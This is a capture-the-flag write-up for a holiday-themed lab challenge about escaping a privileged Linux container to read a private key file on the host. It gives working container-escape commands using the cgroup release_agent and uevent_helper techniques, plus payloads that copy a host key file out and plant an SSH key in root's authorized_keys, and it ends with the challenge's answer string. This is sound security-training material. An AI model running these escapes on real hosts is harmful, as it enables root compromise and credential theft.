# Prison Escape

!!! summary "Prison Escape<br>*Difficulty*: :fontawesome-solid-tree:{: style="color: red;"}:fontawesome-solid-tree:{: style="color: red;"}:fontawesome-solid-tree:{: style="color: red;"}:fontawesome-solid-tree:{: style="color: grey;"}:fontawesome-solid-tree:{: style="color: grey;"}"
    Escape from a container.  Get hints for this challenge from Bow Ninecandle in the Elfen Ring.  What hex string appears in the host file /home/jailer/.ssh/jail.key.priv?


## Elf Introduction

??? quote "Talk to Tinsel Upatree"
    Hiya hiya, I'm Tinsel Upatree!<br>
    Check me out, I'm working side-by-side with a real-life Flobbit. Epic!<br>
    Anyway, would ya' mind looking at this terminal with me?<br>
    It takes a few seconds to start up, but then you're logged into a super secure container environment!<br>
    Or maybe it isn't so secure? I've heard about container escapes, and it has me a tad worried.<br>
    Do you think you could test this one for me? I'd appreciate it!


## Hints and Resources

??? hint "Hints from Bow Ninecastle after completing the <a href="../05_Clone_with_a_Difference/">Clone with a Difference</a> objective"
    **Over-Permissioned**<br>
    When users are over-privileged, they can often act as root. When containers have too many <a href="https://learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/">permissions</a>, they can affect the host!<br>
    <br>
    **Mount Up and Ride**<br>
    Were you able to `mount` up? If so, users' `home/` directories can be a great place to look for secrets...

??? hint "Other Resources"
    **Jared Folkins, DevOps Faux Paws | KringleCon 2022**<br>
    <a href="https://www.youtube.com/watch?v=vIQY_FH1SVk&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=11">https://www.youtube.com/watch?v=vIQY_FH1SVk&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=11</a><br>
    <br>
    **Understanding Docker Container Escapes**<br>
    <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a>


## Solution

Open the terminal next to Tinsel Upatree.

The terminal introduction infers that we are running in a container, but we can verify this with the following command

```
cat /proc/1/cgroup
```

Next, we should see what privileges we have.

```
sudo -l
```

This command reveals that we have full sudo rights, so we will start a shell as root to use from here on

```
sudo sh
```

Next, we need to determine if we are running in a privileged container.  There are several ways to do this, including seeing if we have visibility to devices, having access to disk devices, or if we can create an IP link without throwing an error.

```
ls /dev
fdisk -l
ip link add dummy0 type dummy
```

Now that we know we are in a privileged container we can create our escape using the Notify on Release technique.  There are several ways to setup this escape, but all rely on causing the host to execute a command as root.

The first method, which is what I initially used, creates a Linux control group and a command that will execute when the last task of the group completes.  The second technique, as described in the hint from Bow Ninecastle, creates a command that runs when a new device is mounted.  Both of these will achieve the same results, which is execution of the /cmd file.

=== "cgroup method"
    ```
    mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
    echo 1 > /tmp/cgrp/x/notify_on_release
    host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    echo "$host_path/cmd" > /tmp/cgrp/release_agent
    ```
    After this, running the following command will cause the /cmd file to run on the host
    ```
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs
    ```
=== "device method"
    ```
    host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    echo $host_path/cmd > /sys/kernel/uevent_helper
    ```
    After this, running the following command will cause the /cmd file to run on the host
    ```
    echo change > /sys/class/mem/null/uevent
    ```

Now we need to compose our /cmd file.  Again, there are multiple ways to achieve this objective.

The simple way, since we know the name of the file that we want to access, is to just copy the contents of the target file into an output file that we can access.  A more complex method, but one that gives full shell access, is to use the command to add an ssh public key into the root user's list of authorized keys, then simply ssh to the host machine.  Conveniently for us, the host machine contains a script at the root called keygen.sh that will generate a public / private key pair.

=== "Retrieve target directly"
    ```
    echo "#!/bin/sh" > /cmd
    echo "cat /home/jailer/.ssh/jail.key.priv > $host_path/output" >> /cmd
    chmod +x /cmd
    ```
    Execute the escape with whichever command will do so and then inspect the contents of /output
    ```
    cat /output
    ```

=== "Pop shell"
    First, create the public / private key
    ```
    cd /root
    mkdir .ssh
    cd .ssh
    /keygen.sh
    ```
    After generating the key, copy the private key into the buffer, use an editor to create a file named id_rsa, and set the permissions on the file
    ```
    nano id_rsa
        <paste the text of the private key and save>
    chmod 600 id_rsa
    ```
    Now create the /cmd file
    ```
    echo "#!/bin/sh" > /cmd
	echo "echo '<paste public key here>' >> /root/.ssh/authorized_keys" >> /cmd
	echo "cat /root/.ssh/authorized_keys > $host_path/output" >> /cmd
    ```
    Execute the script with whichever command will do so and then ssh to the host to get full shell
    ```
    ssh 172.17.0.1
    cat /home/jailer/.ssh/jail.key.priv
    ```

??? answer "Answer"
    `082bb339ec19de4935867`




## Completion

??? quote "Talk to Tinsel Upatree"
    Great! Thanks so much for your help!<br>
    Now that you've helped me with this, I have time to tell you about the deployment tech I've been working on!<br>
    Continuous Integration/Continuous Deployment pipelines allow developers to iterate and innovate quickly.<br>
    With this project, once I push a commit, a GitLab runner will automatically deploy the changes to production.<br>
    WHOOPS! I didn’t mean to commit that to http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git...<br>
    Unfortunately, if attackers can get in that pipeline, they can make an awful mess of things!
